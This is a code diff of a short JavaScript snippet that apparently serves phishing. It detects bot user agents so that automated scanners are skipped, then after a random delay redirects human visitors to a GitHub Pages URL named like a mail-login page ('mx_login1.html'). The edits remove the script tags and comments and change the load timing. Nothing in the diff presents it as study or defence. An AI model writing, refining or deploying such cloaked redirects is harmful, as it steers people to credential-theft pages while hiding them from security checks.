@@ -1,4 +1,3 @@
-<script>
 (function () {
   function isBotUserAgent() {
     const bots = [
@@ -10,7 +9,7 @@
   }
 
   function redirectUser() {
-    const delay = Math.floor(Math.random() * 1000) + 1000; // 1–2 seconds
+    const delay = Math.floor(Math.random() * 1000) + 1000;
     console.log("Redirecting in", delay, "ms...");
     setTimeout(() => {
       window.location.href = "https://gbpacific21.github.io/mx_login1.html";
@@ -25,11 +24,9 @@
     redirectUser();
   }
 
-  // Run as soon as possible
-  if (document.readyState === "complete" || document.readyState === "interactive") {
-    init();
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
   } else {
-    window.addEventListener("load", init);
+    init(); // DOM is already ready
   }
 })();
-</script>
